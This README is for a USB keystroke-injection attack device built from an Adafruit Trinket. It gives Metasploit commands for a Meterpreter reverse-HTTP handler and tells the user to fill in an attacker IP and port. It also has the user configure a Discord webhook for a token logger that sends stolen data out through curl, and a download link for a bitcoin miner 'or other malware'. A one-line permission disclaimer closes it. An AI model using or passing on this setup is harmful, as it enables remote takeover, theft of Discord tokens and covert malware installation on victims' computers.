## Icey's Script

[The Best USB Rubber Ducky Solution]

The first thing you will need is the device =roughly $40 cheaper then a real ducky=  [Adafruti Trinket](https://www.adafruit.com/product/1501)

Secondly You Will Need The Trinket Keyboard Library Found [Here](https://learn.adafruit.com/pro-trinket-keyboard/library)

Now, you need the IDE found here [IDE](https://learn.adafruit.com/introducing-pro-trinket/setting-up-arduino-ide)

Lastly, you need the [script](https://pastebin.com/raw/wdZ0axP5)

Now, once you have the script in your IDE, you need to make a few edits:
Make a Backdoor in Metasploit with these commands
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST YOUR-IP-HERE
set LPORT YOUR-PORT-HERE
run -j
```
After that is done, put your ip and port in the ATTACKER_IP section and port in the ATTACKER_PORT section.
Once that is done, change the discord webhook two lines after the "Discord Token LoggerIpTimeName" comment and the webhook at the end of the line that starts with Curl

Now, change the download link under "Bitcoin Miner" to your own direct download link to a miner/other malware

You can also add more exploits yourself with the same format as the others
Once done, plug your device into your PC, make sure it is in 

Once all of this is done, you must do a few more things to upload the script to the device
First: Select the Pro Trinket 5V/16MHz (USB) or Pro Trinket 3V/12MHz (USB) board from the Tools->Board menu
Second: Go into the Tools -> Programmer menu and select the USBtinyISP programmer
Third: Plug in the Trinket, make sure you see the green LED lit (power good) and the red LED pulsing. Press the button if the red LED is not pulsing, to get into bootloader mode.

Click the Upload button (or select File->Upload)

And that’s it! You’re ready to plug in the device. When you plug the device in, once the red flashing indicator has stopped the device has started executing the code.

Enjoy! and remember: only use this on PC's you have permission to use it on
